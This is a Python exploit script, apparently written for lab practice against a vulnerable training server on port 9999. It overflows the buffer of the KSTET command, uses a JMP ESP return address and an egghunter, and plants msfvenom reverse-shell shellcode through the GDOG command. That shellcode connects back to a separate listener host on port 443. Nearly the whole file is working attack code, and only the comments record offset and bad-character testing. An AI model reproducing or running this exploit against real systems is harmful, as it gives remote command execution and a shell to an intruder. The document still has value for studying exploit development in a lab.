#
import socket
rhost = "192.168.9.147"
rport = 9999

#initial crash 5200
#offset 66?
jmpesp = "\x05\x12\x50\x62" #JMP ESP 62501205
jmpbck = "\x90\x90\xEB\xB8" #jump back 48? 50=b0 so ??

#bad = \x00\x40
badchar1 = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
badchar1 +="\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
badchar2 = "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
badchar2 +="\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
badchar3 = "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
badchar3 +="\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
badchar4 = "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
badchar4 +="\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#w00tw00t / bad chars removed
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter +="\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.9.135 LPORT=443 -f python -b \x00\x40
buf =  ""
buf += "\xda\xdc\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x52\xbb\xfc"
buf += "\xe3\xeb\x98\x83\xc0\x04\x31\x58\x13\x03\xa4\xf0\x09"
buf += "\x6d\xa8\x1f\x4f\x8e\x50\xe0\x30\x06\xb5\xd1\x70\x7c"
buf += "\xbe\x42\x41\xf6\x92\x6e\x2a\x5a\x06\xe4\x5e\x73\x29"
buf += "\x4d\xd4\xa5\x04\x4e\x45\x95\x07\xcc\x94\xca\xe7\xed"
buf += "\x56\x1f\xe6\x2a\x8a\xd2\xba\xe3\xc0\x41\x2a\x87\x9d"
buf += "\x59\xc1\xdb\x30\xda\x36\xab\x33\xcb\xe9\xa7\x6d\xcb"
buf += "\x08\x6b\x06\x42\x12\x68\x23\x1c\xa9\x5a\xdf\x9f\x7b"
buf += "\x93\x20\x33\x42\x1b\xd3\x4d\x83\x9c\x0c\x38\xfd\xde"
buf += "\xb1\x3b\x3a\x9c\x6d\xc9\xd8\x06\xe5\x69\x04\xb6\x2a"
buf += "\xef\xcf\xb4\x87\x7b\x97\xd8\x16\xaf\xac\xe5\x93\x4e"
buf += "\x62\x6c\xe7\x74\xa6\x34\xb3\x15\xff\x90\x12\x29\x1f"
buf += "\x7b\xca\x8f\x54\x96\x1f\xa2\x37\xff\xec\x8f\xc7\xff"
buf += "\x7a\x87\xb4\xcd\x25\x33\x52\x7e\xad\x9d\xa5\x81\x84"
buf += "\x5a\x39\x7c\x27\x9b\x10\xbb\x73\xcb\x0a\x6a\xfc\x80"
buf += "\xca\x93\x29\x06\x9a\x3b\x82\xe7\x4a\xfc\x72\x80\x80"
buf += "\xf3\xad\xb0\xab\xd9\xc5\x5b\x56\x8a\x29\x33\x51\xcd"
buf += "\xc2\x46\x61\xd0\xa9\xce\x87\xb8\xdd\x86\x10\x55\x47"
buf += "\x83\xea\xc4\x88\x19\x97\xc7\x03\xae\x68\x89\xe3\xdb"
buf += "\x7a\x7e\x04\x96\x20\x29\x1b\x0c\x4c\xb5\x8e\xcb\x8c"
buf += "\xb0\xb2\x43\xdb\x95\x05\x9a\x89\x0b\x3f\x34\xaf\xd1"
buf += "\xd9\x7f\x6b\x0e\x1a\x81\x72\xc3\x26\xa5\x64\x1d\xa6"
buf += "\xe1\xd0\xf1\xf1\xbf\x8e\xb7\xab\x71\x78\x6e\x07\xd8"
buf += "\xec\xf7\x6b\xdb\x6a\xf8\xa1\xad\x92\x49\x1c\xe8\xad"
buf += "\x66\xc8\xfc\xd6\x9a\x68\x02\x0d\x1f\x98\x49\x0f\x36"
buf += "\x31\x14\xda\x0a\x5c\xa7\x31\x48\x59\x24\xb3\x31\x9e"
buf += "\x34\xb6\x34\xda\xf2\x2b\x45\x73\x97\x4b\xfa\x74\xb2"
egg = "\x77\x30\x30\x74"

buffer = "KSTET /.:/" + egghunter + "\xCC" * (66 - len(egghunter)) + "\x05\x12\x50\x62" + "\xeb\xb8" + "C" * (5011 - 66 - 4 - 2)
#buffer = "KSTET /.:/" + egghunter + "\xCC" * (66 - len(egghunter)) + jmpesp + jmpbck + "C" * (5011 - 66 - 4 - 2)
buffer2 = "GDOG " + egg + egg + buf
#used to send the shellcode and egg first
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rhost,rport))
print s.recv(1024)
print "[!] Sending shellcode with egg"
s.send("GDOG " + egg + egg + buf)
print s.recv(1024)
s.close()

#used to send the egghunter
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rhost,rport))
print s.recv(1024)
print "[!] Sending exploit"
s.send("KSTET /.:/" + egghunter + "\xCC" * (66 - len(egghunter)) + "\x05\x12\x50\x62" + "\xeb\xb8" + "C" * (5011 - 66 - 4 - 2))
print s.recv(1024)
s.close()
